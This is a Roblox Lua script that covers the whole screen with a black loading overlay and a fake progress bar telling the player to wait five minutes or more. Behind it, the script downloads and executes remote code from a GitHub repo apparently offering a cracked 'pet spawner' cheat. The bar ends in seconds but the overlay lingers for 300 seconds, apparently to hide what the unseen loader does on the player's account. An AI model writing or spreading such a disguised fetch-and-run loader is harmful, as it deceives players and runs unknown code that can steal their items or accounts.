local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AestheticLoadingUI"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local blackBackground = Instance.new("Frame")
blackBackground.Size = UDim2.new(1, 0, 1, 0)
blackBackground.Position = UDim2.new(0, 0, 0, 0)
blackBackground.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
blackBackground.BorderSizePixel = 0
blackBackground.Parent = screenGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0.4, 0, 0.22, 0)
frame.Position = UDim2.new(0.3, 0, 0.39, 0)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
frame.Parent = blackBackground

local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 10)
uiCorner.Parent = frame

local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, 0, 0.3, 0)
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "Loading Script..."
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextScaled = true
titleLabel.Parent = frame

local progressBarBG = Instance.new("Frame")
progressBarBG.Size = UDim2.new(0.9, 0, 0.2, 0)
progressBarBG.Position = UDim2.new(0.05, 0, 0.45, 0)
progressBarBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
progressBarBG.BorderSizePixel = 0
progressBarBG.Parent = frame

local bgCorner = Instance.new("UICorner")
bgCorner.CornerRadius = UDim.new(0, 6)
bgCorner.Parent = progressBarBG

local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
progressBar.BorderSizePixel = 0
progressBar.Parent = progressBarBG

local barCorner = Instance.new("UICorner")
barCorner.CornerRadius = UDim.new(0, 6)
barCorner.Parent = progressBar

local percentLabel = Instance.new("TextLabel")
percentLabel.Size = UDim2.new(1, 0, 1, 0)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "0%"
percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
percentLabel.Font = Enum.Font.Gotham
percentLabel.TextScaled = true
percentLabel.Parent = progressBarBG

local infoLabel = Instance.new("TextLabel")
infoLabel.Size = UDim2.new(1, 0, 0.3, 0)
infoLabel.Position = UDim2.new(0, 0, 0.75, 0)
infoLabel.BackgroundTransparency = 1
infoLabel.Text = "PLEASE WAIT 5 MINS OR MORE"
infoLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
infoLabel.Font = Enum.Font.Gotham
infoLabel.TextScaled = true
infoLabel.Parent = frame

local loadSuccess = false
local loadError = nil

task.spawn(function()
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLagHub-PetSpawner/CrackedScript-V1/refs/heads/main/Loader.lua"))()
    end)
    loadSuccess = success
    loadError = err
end)

local steps = 100
local duration = 5
local stepTime = duration / steps

for i = 1, steps do
    local percent = math.floor((i / steps) * 100)
    percentLabel.Text = percent .. "%"
    progressBar:TweenSize(UDim2.new(i / steps, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, stepTime, true)
    wait(stepTime)
end

percentLabel.Text = "100%"
progressBar:TweenSize(UDim2.new(1, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true)

wait(300)
screenGui:Destroy()

if not loadSuccess then
    warn("Failed to load script: " .. tostring(loadError))
end
